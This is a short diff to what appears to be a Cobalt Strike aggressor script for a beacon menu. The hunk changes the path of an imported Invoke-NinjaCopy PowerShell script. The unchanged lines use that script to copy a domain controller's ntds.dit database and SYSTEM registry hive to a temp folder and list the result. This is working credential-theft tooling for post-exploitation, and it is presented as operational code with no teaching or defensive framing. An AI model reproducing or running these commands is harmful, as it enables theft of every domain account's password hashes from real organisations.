@@ -416,7 +416,7 @@ popup beacon_bottom
 		   {
 			local('$bid');
 			foreach $bid ($1) {
-			bpowershell_import($1, script_resource("scripts/Invoke-NinjaCopy.ps1"));
+			bpowershell_import($1, script_resource("Tools/Invoke-NinjaCopy.ps1"));
 			bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\ntds\ntds.dit" -LocalDestination "C:\Windows\temp\ntds.dit"');
 			bpowerpick($1, 'Invoke-NinjaCopy -Path "C:\Windows\system32\config\SYSTEM" -LocalDestination "C:\Windows\temp\SYSTEM"');
 			bshell($1, 'dir /a C:\Windows\temp\\');
